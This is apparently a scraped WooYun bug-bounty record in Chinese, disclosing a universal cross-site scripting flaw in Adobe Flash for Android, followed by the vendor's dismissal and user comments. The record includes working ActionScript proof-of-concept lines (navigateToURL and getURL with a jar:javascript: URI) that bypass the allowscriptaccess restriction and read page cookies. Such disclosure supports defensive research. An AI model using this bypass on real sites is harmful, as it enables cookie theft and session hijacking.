{"id": 191, "wybug_id": "wooyun-2014-071915", "wybug_title": "Adobe Flash for android UXSS", "wybug_corp": "Adobe", "wybug_author": "Sogili", "wybug_date": "2014-08-11 13:46", "wybug_open_date": "2014-11-06 13:48", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-11：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-06：\t细节向公众公开  简要描述： 由于某处限制不当被绕过导致 UXSS。 详细说明：  测试环境：\nMI 3Andriod 4.2.1 JOP0DAdobe Flash v11.1.115.81\n这个漏洞最初是由 masatokinugawa 发现，但 Adobe 收到后一直没有处理 Andriod 的版本，故此再提交一遍 for andriod vuln。大多数网站都允许嵌入外部的媒体，也包括 Flash，但为了防止第三方 swf 中的 JS 脚本执行，一般都会把 allowscriptaccess 设置为 never ，但通过这个漏洞可以绕过这个限制执行 JS。 \nnavigateToURL(new URLRequest(\"jar:javascript:alert('domain:'+document.domain+'\\\\r\\\\nCookies: '+document.cookie);\"),\"testme\");\n或者是这样\ngetURL(\"jar:javascript:alert('domain: '+document.domain+'\\\\r\\\\nCookies: '+document.cookie);\",\"testme\");\n利用 Flash 的 URL 跳转函数请求 test me window 再配合 jar 来执行 js URI 绕过了 allowscriptaccess 的限制。   漏洞证明：  测试：1.使用安卓打开网页 http://jsbin.com/piqozupa/ 。2.这时候跳转到了另外一个页面。3.点击播放 flash 将会出现下图场景。\n\n   修复方案：  就像 windows ver 一样。   版权声明：转载请注明来源 Sogili@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-06 13:48 厂商回复： 已知漏洞，暂不重复处置。 漏洞Rank：12  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-11 13:51 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:59        | http://www.tomatoyu.com/)\t\t \n  留名   2楼是SB    \n     2014-08-11 13:55 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  我好像知道了什么，短短你果然是黑客~    \n     2014-08-11 13:57 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  mark    \n     2014-08-11 14:23 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  又有人喷明明公开了我怎么看不到 ._.    \n     2014-08-11 15:25 |    \t\tSogili \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:27        )\t\t \n  安卓下的所有浏览器包括 webview 都会受到影响。除了上次众测给 UC 报过他们补了。    \n     2014-08-11 15:51 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  0day？    \n     2014-08-13 00:59 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  乌云官网握着的0day，你也敢公开    \n     2014-08-13 12:37 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @超威蓝猫 明明公开了我怎么看不到 ._.    \n     2014-11-06 16:34 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:22        | :))\t\t \n  哎呦喂    \n     2014-12-09 14:37 |    \t\tneobyte \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:11        )\t\t \n  太赞了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}